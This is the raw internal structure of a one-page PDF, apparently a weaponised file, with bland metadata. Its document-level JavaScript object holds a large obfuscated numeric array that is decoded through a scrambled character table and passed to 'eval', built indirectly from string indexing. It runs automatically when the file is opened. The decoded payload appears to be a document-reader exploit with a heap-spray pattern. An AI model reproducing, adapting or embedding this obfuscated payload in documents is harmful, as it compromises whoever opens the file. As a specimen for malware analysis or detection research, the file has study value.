%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[21,
69,
13,
0,
3,
44,
50,
6,
46,
56,
8,
8,
50,
6,
22,
19,
20,
10,
50,
6,
46,
54,
22,
19,
50,
6,
64,
54,
20,
10,
50,
6,
20,
52,
56,
10,
50,
6,
56,
56,
54,
22,
50,
6,
8,
10,
19,
47,
50,
6,
10,
47,
46,
21,
50,
6,
46,
21,
56,
47,
50,
6,
47,
19,
10,
47,
50,
6,
64,
47,
46,
21,
50,
6,
54,
8,
41,
19,
50,
6,
64,
8,
46,
21,
50,
6,
56,
56,
47,
46,
50,
6,
8,
8,
15,
21,
50,
6,
54,
20,
46,
21,
50,
6,
47,
56,
56,
19,
50,
6,
56,
56,
64,
10,
50,
6,
46,
41,
16,
19,
50,
6,
41,
54,
20,
20,
50,
6,
22,
22,
41,
47,
50,
6,
21,
46,
22,
22,
50,
6,
10,
47,
46,
21,
50,
6,
19,
56,
56,
47,
50,
6,
56,
52,
10,
8,
50,
6,
64,
54,
47,
8,
50,
6,
46,
64,
22,
21,
50,
6,
16,
10,
56,
10,
50,
6,
20,
10,
46,
54,
50,
6,
54,
41,
64,
54,
50,
6,
20,
21,
20,
52,
50,
6,
54,
41,
10,
19,
50,
6,
46,
21,
54,
8,
50,
6,
56,
19,
64,
54,
50,
6,
64,
10,
46,
21,
50,
6,
64,
46,
56,
54,
50,
6,
22,
54,
47,
56,
50,
6,
46,
21,
54,
8,
50,
6,
16,
47,
64,
8,
50,
6,
22,
54,
47,
56,
50,
6,
19,
52,
56,
56,
50,
6,
10,
41,
10,
52,
50,
6,
39,
15,
22,
19,
50,
6,
19,
54,
47,
56,
50,
6,
15,
21,
56,
56,
50,
6,
21,
20,
47,
22,
50,
6,
56,
46,
41,
47,
50,
6,
64,
10,
22,
16,
50,
6,
19,
41,
47,
46,
50,
6,
47,
15,
19,
21,
50,
6,
15,
39,
47,
56,
50,
6,
20,
21,
10,
47,
50,
6,
56,
21,
22,
41,
50,
6,
64,
54,
41,
22,
50,
6,
54,
20,
20,
8,
50,
6,
54,
20,
46,
21,
50,
6,
47,
56,
16,
10,
50,
6,
8,
8,
15,
15,
50,
6,
47,
19,
46,
21,
50,
6,
46,
15,
10,
21,
50,
6,
20,
19,
10,
8,
50,
6,
54,
10,
22,
22,
50,
6,
47,
19,
16,
10,
50,
6,
15,
46,
46,
21,
50,
6,
15,
15,
47,
56,
50,
6,
47,
10,
46,
21,
50,
6,
47,
56,
46,
21,
50,
6,
39,
21,
19,
54,
50,
6,
54,
52,
54,
20,
50,
6,
20,
21,
19,
56,
50,
6,
39,
15,
54,
56,
50,
6,
8,
46,
46,
21,
50,
6,
46,
47,
16,
47,
50,
6,
47,
19,
64,
15,
50,
6,
64,
10,
56,
56,
50,
6,
52,
8,
47,
56,
50,
6,
22,
56,
20,
21,
50,
6,
8,
46,
46,
21,
50,
6,
46,
21,
47,
46,
50,
6,
8,
39,
22,
64,
50,
6,
54,
52,
47,
54,
50,
6,
52,
46,
20,
46,
50,
6,
22,
22,
22,
22,
50,
6,
20,
16,
22,
22,
50,
6,
20,
46,
22,
52,
50,
6,
47,
47,
47,
47,
50,
6,
47,
47,
47,
47,
50,
6,
54,
47,
54,
46,
50,
6,
10,
47,
8,
39,
50,
6,
22,
22,
8,
46,
50,
6,
47,
47,
47,
47,
50,
6,
54,
47,
47,
47,
50,
6,
19,
47,
46,
56,
50,
6,
54,
47,
41,
52,
50,
6,
46,
21,
54,
54,
50,
6,
46,
21,
20,
19,
50,
6,
41,
47,
54,
20,
50,
6,
19,
56,
46,
56,
50,
6,
22,
22,
47,
54,
50,
6,
8,
46,
20,
56,
50,
6,
8,
20,
8,
22,
50,
6,
47,
47,
47,
47,
50,
6,
64,
54,
8,
46,
50,
6,
8,
19,
64,
16,
50,
6,
54,
10,
8,
15,
50,
6,
41,
8,
22,
22,
50,
6,
19,
10,
46,
56,
50,
6,
46,
21,
47,
46,
50,
6,
20,
46,
20,
46,
50,
6,
22,
22,
8,
41,
50,
6,
22,
22,
22,
22,
50,
6,
47,
16,
20,
21,
50,
6,
64,
16,
20,
21,
50,
6,
20,
19,
46,
41,
50,
6,
47,
41,
47,
10,
50,
6,
47,
47,
47,
47,
50,
6,
54,
19,
46,
15,
50,
6,
47,
19,
16,
10,
50,
6,
47,
10,
19,
64,
50,
6,
64,
16,
16,
10,
50,
6,
8,
64,
8,
54,
50,
6,
19,
64,
64,
56,
50,
6,
16,
10,
10,
10,
50,
6,
64,
8,
47,
10,
50,
6,
56,
56,
64,
16,
50,
6,
19,
64,
56,
16,
50,
6,
16,
10,
10,
10,
50,
6,
16,
47,
47,
46,
50,
6,
64,
56,
16,
15,
50,
6,
54,
56,
16,
47,
50,
6,
22,
46,
8,
46,
50,
6,
47,
47,
47,
47,
50,
6,
22,
22,
47,
47,
50,
6,
47,
19,
54,
8,
50,
6,
20,
46,
46,
21,
50,
6,
19,
52,
56,
56,
50,
6,
19,
64,
54,
41,
50,
6,
41,
15,
10,
10,
50,
6,
64,
64,
47,
47,
50,
6,
8,
16,
64,
47,
50,
6,
19,
64,
64,
10,
50,
6,
41,
15,
10,
10,
50,
6,
16,
20,
47,
54,
50,
6,
8,
19,
8,
10,
50,
6,
19,
8,
8,
19,
50,
6,
41,
15,
10,
10,
50,
6,
47,
47,
47,
52,
50,
6,
46,
39,
54,
52,
50,
6,
47,
10,
19,
41,
50,
6,
46,
46,
56,
47,
50,
6,
41,
15,
10,
10,
50,
6,
10,
41,
47,
10,
50,
6,
8,
39,
54,
41,
50,
6,
8,
39,
47,
47,
50,
6,
54,
56,
47,
47,
50,
6,
8,
39,
54,
64,
50,
6,
22,
22,
47,
47,
50,
6,
41,
10,
54,
8,
50,
6,
19,
47,
46,
54,
50,
6,
41,
8,
64,
54,
50,
6,
47,
47,
8,
39,
50,
6,
22,
22,
54,
56,
50,
6,
47,
10,
54,
8,
50,
6,
47,
47,
8,
39,
50,
6,
20,
21,
46,
56,
50,
6,
54,
56,
47,
19,
50,
6,
54,
8,
22,
22,
50,
6,
46,
56,
47,
10,
50,
6,
47,
19,
19,
56,
50,
6,
47,
16,
20,
21,
50,
6,
41,
56,
20,
21,
50,
6,
46,
47,
10,
64,
50,
6,
47,
47,
56,
22,
50,
6,
22,
39,
64,
54,
50,
6,
46,
47,
10,
64,
50,
6,
47,
47,
56,
22,
50,
6,
19,
10,
64,
54,
50,
6,
47,
47,
8,
39,
50,
6,
22,
20,
8,
39,
50,
6,
54,
8,
22,
22,
50,
6,
20,
46,
47,
46,
50,
6,
22,
20,
52,
19,
50,
6,
22,
22,
22,
22,
50,
6,
10,
20,
46,
20,
50,
6,
20,
19,
47,
20,
50,
6,
22,
20,
52,
46,
50,
6,
47,
20,
46,
39,
50,
6,
8,
22,
46,
52,
50,
6,
21,
15,
47,
41,
50,
6,
19,
39,
56,
56,
50,
6,
54,
21,
46,
39,
50,
6,
19,
8,
41,
21,
50,
6,
64,
52,
10,
8,
50,
6,
41,
39,
56,
8,
50,
6,
64,
47,
16,
22,
50,
6,
64,
10,
8,
46,
50,
6,
64,
47,
64,
10,
50,
6,
16,
22,
56,
39,
50,
6,
56,
41,
16,
22,
50,
6,
56,
46,
56,
54,
50,
6,
56,
16,
16,
20,
50,
6,
56,
54,
56,
54,
50,
6,
56,
16,
16,
20,
50,
6,
56,
41,
56,
41,
50,
6,
56,
52,
16,
20,
50,
6,
56,
39,
56,
16,
50,
6,
56,
47,
56,
46,
50,
6,
56,
47,
56,
46,
50,
6,
64,
64,
16,
22,
50,
6,
64,
47,
16,
20,
50,
6,
64,
47,
8,
46,
50,
6,
8,
8,
56,
22,
50,
6,
56,
16,
56,
15,
50,
6,
56,
54,
56,
64,
50,
6,
16,
8,
56,
56,
50,
6,
56,
15,
8,
54,
50,
6,
47,
47,
56,
56,
50,
6,
47,
47,
47,
47,
44,
2,
22,
6,
72,
19,
53,
17,
55,
72,
11,
20,
23,
18,
42,
49,
42,
39,
58,
31,
25,
66,
4,
37,
33,
17,
59,
20,
49,
42,
39,
45,
59,
20,
72,
0,
53,
33,
14,
16,
48,
31,
25,
66,
4,
42,
39,
27,
3,
42,
39,
2,
30,
42,
39,
3,
42,
39,
45,
13,
6,
21,
13,
53,
42,
17,
72,
0,
49,
47,
58,
31,
25,
68,
16,
66,
2,
42,
20,
53,
6,
42,
72,
11,
42,
39,
2,
30,
11,
22,
6,
72,
19,
53,
17,
55,
72,
11,
21,
38,
49,
66,
4,
18,
39,
42,
11,
15,
57,
0,
3,
72,
20,
37,
11,
28,
42,
42,
39,
25,
49,
66,
2,
18,
39,
42,
11,
18,
37,
3,
47,
38,
47,
19,
47,
19,
47,
19,
47,
19,
2,
18,
39,
42,
11,
39,
15,
15,
42,
3,
47,
38,
10,
47,
47,
47,
47,
47,
2,
18,
39,
42,
11,
34,
39,
25,
59,
55,
39,
15,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
21,
69,
13,
0,
66,
2,
18,
39,
42,
11,
13,
19,
51,
59,
20,
72,
3,
34,
39,
25,
59,
55,
39,
15,
45,
59,
20,
72,
0,
53,
33,
14,
16,
2,
18,
39,
42,
11,
31,
25,
3,
39,
15,
15,
42,
24,
49,
13,
19,
51,
59,
20,
72,
27,
47,
38,
56,
46,
66,
2,
18,
39,
42,
11,
25,
39,
42,
13,
34,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
6,
52,
47,
52,
47,
50,
6,
52,
47,
52,
47,
32,
66,
2,
25,
39,
42,
13,
34,
3,
20,
23,
18,
42,
49,
25,
39,
42,
13,
34,
58,
31,
25,
66,
2,
18,
39,
42,
11,
19,
55,
6,
72,
53,
16,
3,
49,
18,
37,
24,
47,
38,
10,
47,
47,
47,
47,
47,
66,
68,
39,
15,
15,
42,
2,
22,
55,
42,
49,
18,
39,
42,
11,
19,
55,
6,
72,
53,
3,
47,
2,
19,
55,
6,
72,
53,
48,
19,
55,
6,
72,
53,
16,
2,
19,
55,
6,
72,
53,
27,
27,
66,
4,
15,
57,
0,
36,
19,
55,
6,
72,
53,
75,
3,
25,
39,
42,
13,
34,
27,
34,
39,
25,
59,
55,
39,
15,
2,
30,
11,
18,
39,
42,
11,
55,
18,
20,
42,
22,
59,
55,
37,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
6,
47,
19,
47,
19,
50,
6,
47,
19,
47,
19,
32,
66,
2,
37,
33,
17,
59,
20,
49,
55,
18,
20,
42,
22,
59,
55,
37,
45,
59,
20,
72,
0,
53,
33,
48,
10,
10,
52,
54,
16,
66,
4,
55,
18,
20,
42,
22,
59,
55,
37,
27,
3,
55,
18,
20,
42,
22,
59,
55,
37,
2,
30,
11,
53,
33,
17,
13,
45,
19,
55,
59,
59,
39,
21,
26,
53,
55,
42,
20,
3,
67,
55,
59,
59,
39,
21,
45,
19,
55,
59,
59,
20,
19,
53,
40,
70,
39,
17,
59,
73,
72,
22,
55,
49,
4,
13,
6,
21,
69,
5,
32,
32,
58,
70,
13,
0,
5,
55,
18,
20,
42,
22,
59,
55,
37,
30,
66,
2,
30,
11,
22,
6,
72,
19,
53,
17,
55,
72,
11,
34,
42,
17,
72,
53,
22,
49,
66,
4,
72,
55,
34,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
6,
47,
28,
47,
28,
50,
6,
47,
28,
47,
28,
50,
6,
47,
28,
47,
28,
50,
6,
47,
28,
47,
28,
32,
66,
2,
18,
39,
42,
11,
34,
39,
25,
59,
55,
39,
15,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
21,
69,
13,
0,
66,
2,
33,
20,
39,
34,
21,
59,
55,
19,
57,
3,
72,
55,
34,
27,
34,
39,
25,
59,
55,
39,
15,
2,
21,
17,
0,
21,
59,
55,
19,
57,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
6,
47,
28,
47,
28,
50,
6,
47,
28,
47,
28,
32,
66,
2,
33,
20,
39,
15,
20,
42,
13,
17,
23,
20,
3,
16,
47,
2,
13,
34,
42,
39,
25,
3,
33,
20,
39,
15,
20,
42,
13,
17,
23,
20,
27,
33,
20,
39,
34,
21,
59,
55,
19,
57,
45,
59,
20,
72,
0,
53,
33,
2,
37,
33,
17,
59,
20,
49,
21,
17,
0,
21,
59,
55,
19,
57,
45,
59,
20,
72,
0,
53,
33,
48,
13,
34,
42,
39,
25,
66,
4,
21,
17,
0,
21,
59,
55,
19,
57,
27,
3,
21,
17,
0,
21,
59,
55,
19,
57,
2,
30,
11,
22,
17,
59,
59,
21,
59,
55,
19,
57,
3,
21,
17,
0,
21,
59,
55,
19,
57,
45,
13,
6,
21,
13,
53,
42,
17,
72,
0,
49,
47,
58,
13,
34,
42,
39,
25,
66,
2,
21,
59,
55,
19,
57,
3,
21,
17,
0,
21,
59,
55,
19,
57,
45,
13,
6,
21,
13,
53,
42,
17,
72,
0,
49,
47,
58,
21,
17,
0,
21,
59,
55,
19,
57,
45,
59,
20,
72,
0,
53,
33,
24,
13,
34,
42,
39,
25,
66,
2,
37,
33,
17,
59,
20,
49,
21,
59,
55,
19,
57,
45,
59,
20,
72,
0,
53,
33,
27,
13,
34,
42,
39,
25,
48,
47,
38,
10,
47,
47,
47,
47,
66,
4,
21,
59,
55,
19,
57,
3,
21,
59,
55,
19,
57,
27,
21,
59,
55,
19,
57,
27,
22,
17,
59,
59,
21,
59,
55,
19,
57,
2,
30,
11,
70,
20,
70,
3,
72,
20,
37,
11,
28,
42,
42,
39,
25,
49,
66,
2,
22,
55,
42,
49,
17,
3,
47,
2,
17,
48,
41,
10,
47,
47,
2,
17,
27,
27,
66,
4,
70,
20,
70,
36,
17,
75,
3,
21,
59,
55,
19,
57,
27,
33,
20,
39,
34,
21,
59,
55,
19,
57,
2,
30,
11,
18,
39,
42,
11,
72,
6,
70,
3,
41,
16,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
52,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
46,
2,
6,
53,
17,
59,
45,
34,
42,
17,
72,
53,
22,
49,
32,
50,
10,
54,
47,
47,
47,
22,
32,
58,
72,
6,
70,
66,
2,
30,
11,
22,
6,
72,
19,
53,
17,
55,
72,
11,
0,
20,
53,
17,
19,
55,
72,
49,
66,
4,
18,
39,
42,
11,
39,
42,
42,
25,
3,
72,
20,
37,
11,
28,
42,
42,
39,
25,
49,
66,
2,
17,
22,
49,
39,
34,
34,
45,
15,
55,
19,
45,
67,
55,
59,
59,
39,
21,
45,
0,
20,
53,
73,
19,
55,
72,
66,
4,
18,
39,
42,
11,
34,
39,
25,
59,
55,
39,
15,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
21,
69,
13,
0,
66,
2,
18,
39,
42,
11,
33,
35,
31,
54,
47,
47,
67,
60,
3,
34,
39,
25,
59,
55,
39,
15,
45,
59,
20,
72,
0,
53,
33,
14,
16,
2,
18,
39,
42,
11,
31,
25,
3,
47,
38,
10,
47,
47,
47,
47,
47,
24,
49,
33,
35,
31,
54,
47,
47,
67,
60,
27,
47,
38,
56,
46,
66,
2,
18,
39,
42,
11,
25,
39,
42,
13,
34,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
6,
52,
47,
52,
47,
50,
6,
52,
47,
52,
47,
32,
66,
2,
25,
39,
42,
13,
34,
3,
20,
23,
18,
42,
49,
25,
39,
42,
13,
34,
58,
31,
25,
66,
2,
18,
39,
42,
11,
34,
54,
28,
69,
71,
8,
54,
22,
3,
49,
47,
38,
47,
19,
47,
19,
47,
19,
47,
19,
24,
47,
38,
10,
47,
47,
47,
47,
47,
66,
68,
47,
38,
10,
47,
47,
47,
47,
47,
2,
22,
55,
42,
49,
18,
39,
42,
11,
18,
31,
19,
63,
29,
52,
8,
25,
3,
47,
2,
18,
31,
19,
63,
29,
52,
8,
25,
48,
34,
54,
28,
69,
71,
8,
54,
22,
2,
18,
31,
19,
63,
29,
52,
8,
25,
27,
27,
66,
4,
39,
42,
42,
25,
36,
18,
31,
19,
63,
29,
52,
8,
25,
75,
3,
25,
39,
42,
13,
34,
27,
34,
39,
25,
59,
55,
39,
15,
2,
30,
11,
18,
39,
42,
11,
53,
1,
65,
33,
60,
21,
62,
37,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
32,
50,
47,
52,
32,
66,
2,
37,
33,
17,
59,
20,
49,
53,
1,
65,
33,
60,
21,
62,
37,
45,
59,
20,
72,
0,
53,
33,
48,
47,
38,
10,
47,
47,
47,
66,
4,
53,
1,
65,
33,
60,
21,
62,
37,
27,
3,
53,
1,
65,
33,
60,
21,
62,
37,
2,
30,
11,
53,
1,
65,
33,
60,
21,
62,
37,
3,
32,
60,
45,
32,
27,
53,
1,
65,
33,
60,
21,
62,
37,
2,
39,
34,
34,
45,
15,
55,
19,
45,
67,
55,
59,
59,
39,
21,
45,
0,
20,
53,
73,
19,
55,
72,
49,
53,
1,
65,
33,
60,
21,
62,
37,
66,
2,
30,
30,
11,
39,
43,
59,
6,
0,
17,
72,
13,
3,
39,
34,
34,
45,
34,
59,
6,
0,
73,
72,
13,
2,
18,
39,
42,
11,
13,
18,
3,
34,
39,
42,
13,
20,
73,
72,
53,
49,
39,
34,
34,
45,
18,
17,
20,
37,
20,
42,
7,
20,
42,
13,
17,
55,
72,
45,
53,
55,
26,
53,
42,
17,
72,
0,
49,
66,
45,
19,
33,
39,
42,
28,
53,
49,
47,
66,
66,
2,
22,
55,
42,
49,
18,
39,
42,
11,
17,
3,
47,
2,
17,
48,
39,
43,
59,
6,
0,
17,
72,
13,
45,
59,
20,
72,
0,
53,
33,
2,
17,
27,
27,
66,
4,
17,
22,
49,
39,
43,
59,
6,
0,
17,
72,
13,
36,
17,
75,
45,
72,
39,
70,
20,
3,
3,
44,
40,
26,
19,
42,
17,
34,
53,
44,
66,
4,
18,
39,
42,
11,
59,
18,
3,
39,
43,
59,
6,
0,
17,
72,
13,
36,
17,
75,
45,
18,
20,
42,
13,
17,
55,
72,
2,
30,
30,
11,
17,
22,
49,
49,
59,
18,
3,
3,
52,
66,
12,
12,
49,
49,
13,
18,
3,
3,
46,
66,
61,
61,
49,
59,
18,
48,
3,
46,
45,
41,
16,
66,
66,
66,
4,
0,
20,
53,
17,
19,
55,
72,
49,
66,
2,
30,
20,
59,
13,
20,
11,
17,
22,
49,
59,
18,
3,
3,
64,
45,
41,
66,
4,
34,
42,
17,
72,
53,
22,
49,
66,
2,
30,
20,
59,
13,
20,
11,
17,
22,
49,
49,
49,
13,
18,
3,
3,
8,
66,
12,
12,
49,
13,
18,
3,
3,
64,
66,
66,
61,
61,
49,
59,
18,
48,
64,
45,
41,
41,
66,
66,
4,
21,
38,
49,
66,
2,
30,
20,
59,
13,
20,
11,
17,
22,
49,
49,
59,
18,
9,
3,
52,
45,
41,
66,
12,
12,
49,
59,
18,
48,
3,
52,
45,
16,
66,
12,
12,
49,
59,
18,
9,
3,
46,
45,
41,
56,
66,
12,
12,
49,
59,
18,
48,
3,
46,
45,
41,
64,
66,
66,
4,
22,
6,
72,
19,
53,
17,
55,
72,
11,
39,
49,
66,
4,
6,
53,
17,
59,
45,
34,
42,
17,
72,
53,
15,
49,
44,
34,
74,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
41,
11,
5,
11,
25,
25,
25,
25,
41,
41,
41,
44,
58,
72,
20,
37,
11,
29,
39,
53,
20,
49,
66,
66,
2,
30,
18,
39,
42,
11,
33,
3,
39,
34,
34,
45,
34,
59,
6,
0,
73,
72,
13,
2,
22,
55,
42,
49,
18,
39,
42,
11,
22,
3,
47,
2,
22,
48,
33,
45,
59,
20,
72,
0,
53,
33,
2,
22,
27,
27,
66,
4,
17,
22,
49,
33,
36,
22,
75,
45,
72,
39,
70,
20,
3,
3,
44,
40,
26,
19,
42,
17,
34,
53,
44,
66,
4,
18,
39,
42,
11,
17,
3,
33,
36,
22,
75,
45,
18,
20,
42,
13,
17,
55,
72,
2,
30,
30,
11,
17,
22,
49,
49,
17,
9,
46,
45,
41,
16,
66,
61,
61,
49,
17,
48,
46,
45,
16,
66,
66,
4,
19,
3,
72,
20,
37,
11,
28,
42,
42,
39,
25,
49,
66,
2,
18,
39,
42,
11,
15,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
44,
50,
6,
52,
47,
52,
47,
50,
6,
52,
47,
52,
47,
44,
66,
2,
18,
39,
42,
11,
20,
3,
6,
72,
20,
13,
19,
39,
34,
20,
49,
21,
69,
13,
0,
66,
2,
37,
33,
17,
59,
20,
49,
15,
45,
59,
20,
72,
0,
53,
33,
48,
3,
47,
38,
46,
47,
47,
47,
66,
4,
15,
27,
3,
15,
2,
30,
15,
3,
15,
45,
13,
6,
21,
13,
53,
42,
49,
47,
58,
47,
38,
46,
47,
47,
47,
24,
20,
45,
59,
20,
72,
0,
53,
33,
66,
2,
22,
55,
42,
49,
22,
3,
47,
2,
22,
48,
16,
52,
47,
47,
2,
22,
27,
27,
66,
4,
19,
36,
22,
75,
3,
15,
27,
20,
2,
30,
39,
49,
66,
2,
39,
49,
66,
2,
53,
42,
25,
4,
53,
33,
17,
13,
45,
70,
20,
15,
17,
39,
45,
72,
20,
37,
43,
59,
39,
25,
20,
42,
49,
72,
6,
59,
59,
66,
2,
30,
19,
39,
53,
19,
33,
49,
20,
66,
4,
30,
39,
49,
66,
2,
30,
30];
cc={q:"gU;={:uV6>4 |s*d2ivcebfz-yS+AD}q'hpW[wxaE1rP'.80<\(%_9t5o3k,lN&GQ7M\)C/jmKnI@]"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3872<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF